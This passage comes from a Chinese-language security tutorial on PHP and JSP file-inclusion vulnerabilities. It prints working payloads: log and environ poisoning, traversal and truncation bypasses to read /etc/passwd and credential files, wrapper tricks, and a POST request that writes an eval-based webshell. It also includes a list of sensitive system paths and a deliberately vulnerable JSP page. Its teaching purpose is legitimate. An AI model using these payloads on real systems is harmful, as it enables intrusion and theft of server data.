<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102141318.png" data-fancybox="true"/></div></div>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.91.134/include.php?<span class="built_in">test</span>=D:\phpStudy\PHPTutorial\Apache\logs\error.log</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102142133.png" data-fancybox="true"/></div></div>

<p>正常服务器中的日志文件位置:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/apache2/access.log</span><br></pre></td></tr></table></figure>

<h3 id="包含SSH-log"><a href="#包含SSH-log" class="headerlink" title="包含SSH log"></a>包含SSH log</h3><p>**条件:**需要知道ssh-log的位置,且可读.默认情况下为 &#x2F;var&#x2F;log&#x2F;auth.log</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用ssh连接</span></span><br><span class="line">ssh &lt;?php phpinfo();?&gt;@192.168.91.149</span><br></pre></td></tr></table></figure>

<p>这是在服务器上的<code>auth.log</code>文件上就会记录下如下内容:</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102142324.png" data-fancybox="true"/></div></div>

<p>再进行文件包含即可:</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102143438.png" data-fancybox="true"/></div></div>

<h3 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h3><p>proc&#x2F;self&#x2F;environ中会保存user-agent头.如果在user-agent中插入php代码,则php代码会被写入到environ中.之后再包含它,即可.</p>
<p><strong>条件:</strong></p>
<ol>
<li>php以cgi方式运行,这样environ才会保持UA头.</li>
<li>environ文件存储位置已知,且environ文件可读.</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../proc/self/environ</span><br></pre></td></tr></table></figure>

<p>在访问的时候抓包把user-agent修改为<code>&lt;?php phpinfo();?&gt;</code>即可.</p>
<blockquote>
<p>这个没有尝试成功,这一个文件似乎没有user-agent???</p>
</blockquote>
<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>以上这些方法都要求PHP能过包含这些不处于Web目录下的文件,如果PHP设置了open_basedir,则很可能会使得攻击失效.</p>
<p>php中上传文件,会创建临时文件.在linux下使用<code>/tmp</code>目录,而在windows下使用<code>c:\winsdows\temp</code>目录.在临时文件被删除之前,利用<strong>条件竞争</strong>即可包含该临时文件.</p>
<p>由于包含需要知道包含的文件名.一种方法是进行暴力猜解,linux下使用的随机函数有缺陷,而window下只有65535种不同的文件名,所以这个方法是可行的.</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102143424.png" data-fancybox="true"/></div></div>

<p>或者利用phpinfo能查看临时文件名字的方法去进行利用:</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201136">PHP LFI 利用临时文件 Getshell 姿势</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">PHP文件包含漏洞(利用phpinfo)</a></p>
</li>
</ul>
<h2 id="文件包含漏洞常见绕过技巧"><a href="#文件包含漏洞常见绕过技巧" class="headerlink" title="文件包含漏洞常见绕过技巧"></a>文件包含漏洞常见绕过技巧</h2><h3 id="00字符截断"><a href="#00字符截断" class="headerlink" title="00字符截断"></a>00字符截断</h3><blockquote>
<p>PHP版本&lt;&#x3D;5.3.4</p>
<p>magic_quotes_gpc &#x3D; Off</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=../../etc/passwd%00</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里固定了后缀名为php,可以使用截断的方式来访问我们想要的文件.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=info.php%00</span><br></pre></td></tr></table></figure>

<p><code>%00</code>会被解析为<code>0x00</code>,所以导致截断的发生 我们通过截断成功的绕过了后缀限制</p>
<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><blockquote>
<p>php版本小于5.3.10</p>
</blockquote>
<p>文件路径有长度限制,目录字符串在Windows下256字节、Linux下4096字节时,会达到最大值,最大值之后的字符被丢弃.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">././././././././././././abc..........</span><br><span class="line">//////////////////abc.........</span><br><span class="line">../1/abc../1/abc../1/abc........</span><br></pre></td></tr></table></figure>

<p>就是在后面接很多个<code>.</code>,让后面的后缀抛弃掉.</p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>可以使用<code>../../../</code>这样的方式来返回到上层目录中,这种方式又被称为”<strong>目录遍历(Path Traversal)</strong>“.常见的目录遍历漏洞,还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF) :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%2e%2e%2f    -&gt;    ../</span><br><span class="line">%2e%2e/     -&gt;    ../</span><br><span class="line">..%2f     -&gt;    ../</span><br><span class="line">%2e%2e%5c    -&gt;    ..\</span><br><span class="line">%2e%2e%\    -&gt;    ..\</span><br><span class="line">..%5c     -&gt;    ..\</span><br><span class="line">%252e%252e%255c    -&gt;    ..\</span><br><span class="line">..%255c     -&gt;    ..\</span><br></pre></td></tr></table></figure>

<h3 id="URL绕过"><a href="#URL绕过" class="headerlink" title="URL绕过"></a>URL绕过</h3><p>假设服务器后端给我们传入的文件加了指定的后面的内容,可以使用以下的方法进行绕过,假设后端给传入的内容拼接上<code>/test/test.php</code></p>
<h4 id="query"><a href="#query" class="headerlink" title="query(?)"></a>query(?)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://remoteaddr/remoteinfo.txt? </span><br></pre></td></tr></table></figure>

<p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code></p>
<p>问号后面的部分<code>/test/test.php</code>,也就是指定的后缀被当作query从而被绕过.</p>
<h4 id="fragment"><a href="#fragment" class="headerlink" title="fragment(#)"></a>fragment(#)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure>

<p>则包含的文件为<code>http://remoteaddr/remoteinfo.txt#/test/test.php</code></p>
<p>问号后面的部分<code>/test/test.php</code>,也就是指定的后缀被当作fragment从而被绕过.注意需要把<code>#</code>进行url编码为<code>%23</code>.</p>
<h3 id="require-once绕过重复包含文件"><a href="#require-once绕过重复包含文件" class="headerlink" title="require_once绕过重复包含文件"></a>require_once绕过重复包含文件</h3><p>原理:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a> (太长看不懂系列)</p>
<blockquote>
<p>PHP最新版的小Trick, require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
</blockquote>
<p>&#x2F;proc&#x2F;self指向当前进程的&#x2F;proc&#x2F;pid&#x2F;,&#x2F;proc&#x2F;self&#x2F;root&#x2F;是指向&#x2F;的符号链接,想到这里,用伪协议配合多级符号链接的办法进行绕过.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/log/apache2<span class="comment"># cd /proc/self/root/</span></span><br><span class="line">root@ubuntu:/proc/self/root<span class="comment"># ls</span></span><br><span class="line">bin    dev   home            lib         media  proc  sbin  swapfile  tmp  vmlinuz</span><br><span class="line">boot   etc   initrd.img      lib64       mnt    root  snap  sys       usr  vmlinuz.old</span><br><span class="line">cdrom  flag  initrd.img.old  lost+found  opt    run   srv   <span class="built_in">test</span>      var</span><br><span class="line">root@ubuntu:/proc/self/root<span class="comment"># cd /</span></span><br><span class="line">root@ubuntu:/<span class="comment"># ls</span></span><br><span class="line">bin    dev   home            lib         media  proc  sbin  swapfile  tmp  vmlinuz</span><br><span class="line">boot   etc   initrd.img      lib64       mnt    root  snap  sys       usr  vmlinuz.old</span><br><span class="line">cdrom  flag  initrd.img.old  lost+found  opt    run   srv   <span class="built_in">test</span>      var</span><br></pre></td></tr></table></figure>

<p>可以看到这里<code>/proc/self/root/</code>和<code>/</code>指向的目录是一样的.</p>
<p>example:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>这样就可以绕过<code>require_once()</code>只能包含一次相同文件的限制.</p>
<h3 id="php-filter绕过exit"><a href="#php-filter绕过exit" class="headerlink" title="php:&#x2F;&#x2F;filter绕过exit"></a>php:&#x2F;&#x2F;filter绕过exit</h3><p>有时候后端会对我们输入的代码前面加上一段<code>exit()</code>函数,使得我们写入的代码无法执行,这时候如果可以使用<code>php://filter</code>伪协议对内容进行编码解码,即可绕过</p>
<p>详见:<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php:&#x2F;&#x2F;filter的妙用</a></p>
<h2 id="文件包含漏洞常见的伪协议"><a href="#文件包含漏洞常见的伪协议" class="headerlink" title="文件包含漏洞常见的伪协议"></a>文件包含漏洞常见的伪协议</h2><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202305082233073.png" data-fancybox="true"/></div></div>

<p>文件包含漏洞常常是由于应用程序对用户输入的文件路径参数没有充分验证和过滤,而导致攻击者可以构造特殊的文件路径参数来读取、执行或包含应用程序中的敏感文件.攻击者可以利用多种伪协议来构造恶意的文件路径参数,以下是常见的伪协议:</p>
<h3 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php:&#x2F;&#x2F; 输入输出流"></a>php:&#x2F;&#x2F; 输入输出流</h3><p>PHP 提供了一些杂项输入&#x2F;输出(IO)流,允许访问 PHP 的输入输出流、标准输入输出和错误描述符, 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器.</p>
<blockquote>
<p>php:&#x2F;&#x2F;filter</p>
<p>元封装器,设计用于”数据流打开”时的”筛选过滤”应用,对本地磁盘文件进行读写.</p>
</blockquote>
<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=你要读取的东西</span><br></pre></td></tr></table></figure>

<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/path/include.php?filename=php://filter/read=convert.base64-encode/resource=你要读取的东西</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果在某些场合发现明明存在文件包含漏洞但是某些东西无法读取的话,</p>
<p>可以base64编码解决</p>
</blockquote>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051546265.png" data-fancybox="true"/></div></div>

<h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><p>只是读取,需要开启 <code>allow_url_fopen</code>,不需要开启 <code>allow_url_include</code>;</p>
<h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h3><p>这个参数是就是php解压缩包的一个函数,不管后缀是什么,都会当做压缩包来解压.</p>
<h4 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包/内部文件</span><br><span class="line">phar://../../../phpinfo.zip/phpinfo.jpg</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意: PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩,rar不行,将木马文件压缩后,改为其他任意格式的文件都可以正常使用.</p>
</blockquote>
<h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><p>写一个php文件,然后用zip压缩为zip文件,然后将后缀改为png等其他格式,然后传入服务器.</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051551760.png" data-fancybox="true"/></div></div>

<p>然后再通过文件上传漏洞和<code>phar://</code>伪协议解析</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847445.png" data-fancybox="true"/></div></div>

<p>同理,也可以通过这种思路进行getshell,</p>
<p>将php文件中的phpinfo的代码改为一句话木马即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h3><p>zip伪协议和phar协议类似,但是用法不一样.</p>
<h4 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=zip://[压缩文件]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure>

<h4 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h4><p>PHP &gt; &#x3D;5.3.0</p>
<blockquote>
<p>#在浏览器中要编码为%23,否则浏览器默认不会传输特殊字符.</p>
</blockquote>
<h4 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h4><p>依旧是先上传,再利用文件包含漏洞进行解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/path/include.php?filename=zip://info.jpg%23info.php</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847470.png" data-fancybox="true"/></div></div>

<p>和phar一样,可shell</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>可以访问请求的原始数据的只读流.即可以直接读取到POST上没有经过解析的原始数据. enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的.</p>
<h4 id="用法-3"><a href="#用法-3" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure>

<p>数据利用POST传过去.</p>
<h4 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h4><p>php配置文件中需同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>(PHP &lt; 5.3.0),就可以造成任意代码执行,在这可以理解成远程文件包含漏洞(RFI),即POST过去PHP代码,即可执行.</p>
<h4 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h4><p>如果POST的数据是执行写入一句话木马的PHP代码,就会在当前目录下写入一个木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意:当前目录Web应用工作的用户必须要<strong>有写权限</strong>,否则写不了</p>
</blockquote>
<p>发送POST包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/include.php?filename=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ruby">&lt;<span class="string">?P</span>HP fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="string">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847509.png" data-fancybox="true"/></div></div>

<p>然后用你的Webshell工具连接即可</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847543.png" data-fancybox="true"/></div></div>

<h3 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h3><p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-481803.html">https://www.php.cn/php-weizijiaocheng-481803.html</a></p>
<h2 id="补充-系统中的敏感路径"><a href="#补充-系统中的敏感路径" class="headerlink" title="补充:系统中的敏感路径"></a>补充:系统中的敏感路径</h2><p>常见的敏感路径:</p>
<ul>
<li>Windows <ul>
<li><code>C:\boot.ini</code>  查看系统版本 </li>
<li><code>C:\windows\system32\inetsrv\MetaBase.xml</code>  IIS 配置文件 </li>
<li><code>C:\windows\repair\sam</code>  存储windows系统初次安装的密码 </li>
<li><code>C:\Program Files\mysql\my.ini</code>  mysql 配置 </li>
<li><code>C:\Program Files\mysql\data\mysql\user.MYD</code>  Mysql root </li>
<li><code>C:\windows\php.ini</code>  php 配置信息 </li>
<li><code>C:\windows\my.ini</code>  mysql 配置文件</li>
</ul>
</li>
<li>UNIX&#x2F;Linux <ul>
<li><code>/etc/passwd </code></li>
<li><code>/usr/local/app/apache2/conf/httpd.conf</code>  apache2 默认配置文件 </li>
<li><code>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</code>  虚拟网站设置 </li>
<li><code>/usr/local/app/php5/lib/php.ini</code>  PHP 相关配置 </li>
<li><code>/etc/httpd/conf/httpd.conf</code>  apache </li>
<li><code>/etc/php5/apache2/php.ini</code>  ubuntu 系统的默认路径</li>
</ul>
</li>
</ul>
<p>日志默认路径</p>
<ul>
<li>apache+Linux 日志默认路径<br><code>/etc/httpd/logs/access_log</code>或者<code>/var/log/httpd/access_log</code> </li>
<li>apache+win2003 日志默认路径<br><code>D:\xampp\apache\logs\access.log</code>, <code>D:\xampp\apache\logs\error.log</code> </li>
<li>IIS6.0+win2003 默认日志文件<br><code>C:\WINDOWS\system32\Logfiles</code> </li>
<li>IIS7.0+win2003 默认日志文件<br><code>%SystemDrive%\inetpub\logs\LogFiles</code> </li>
<li>nginx 日志文件<br>日志文件在用户安装目录 logs 目录下,以我的安装路径为例<code>/usr/local/nginx</code>,<br>那我的日志目录就是在<code>/usr/local/nginx/logs</code>里</li>
</ul>
<p>web 中间件默认配置</p>
<ul>
<li>apache+linux 默认配置文件<br><code>/etc/httpd/conf/httpd.conf</code>或者<code>index.php?page=/etc/init.d/httpd</code> </li>
<li>IIS6.0+win2003 配置文件<br><code>C:/Windows/system32/inetsrv/metabase.xml</code> </li>
<li>IIS7.0+WIN 配置文件<br><code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></li>
</ul>
<blockquote>
<p>P.S. burp的intruder里面自带一些路径</p>
</blockquote>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847569.png" data-fancybox="true"/></div></div>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847442.png" data-fancybox="true"/></div></div>

<h2 id="Javaweb-文件包含-扩展"><a href="#Javaweb-文件包含-扩展" class="headerlink" title="Javaweb:文件包含(扩展)"></a>Javaweb:文件包含(扩展)</h2><p>以为只有PHP中存在文件包含漏洞?</p>
<p>不不不~~  :)</p>
<p>实际上只要存在文件包含的功能,无论语言都有可能存在这样的问题,</p>
<p>而且利用的逻辑基本上是相同的</p>
<h3 id="漏洞复习"><a href="#漏洞复习" class="headerlink" title="漏洞复习"></a>漏洞复习</h3><p>在目标机器上起一个Tomcat环境</p>
<p>新建一个<code>test.jsp</code>,</p>
<p>输入以下代码搭建一个简单的javaweb文件包含漏洞环境</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--输出提示--&gt;</span></span><br><span class="line">&lt;%out.println(&quot;Input your payload as GET parameter &#x27;payload&#x27;&quot;);%&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">&lt;%out.println(&quot;Output: &quot;);%&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--获取payload参数内容传入变量payload--&gt;</span></span><br><span class="line">&lt;%String payload = request.getParameter(&quot;payload&quot;);%&gt;</span><br><span class="line"><span class="comment">&lt;!--包含变量payload内的内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp:include</span> <span class="attr">page</span>=<span class="string">&quot;$&#123;param.payload&#125;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>给payload参数传你想要包含的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8080/path/test.jsp?payload=文件名</span><br></pre></td></tr></table></figure>

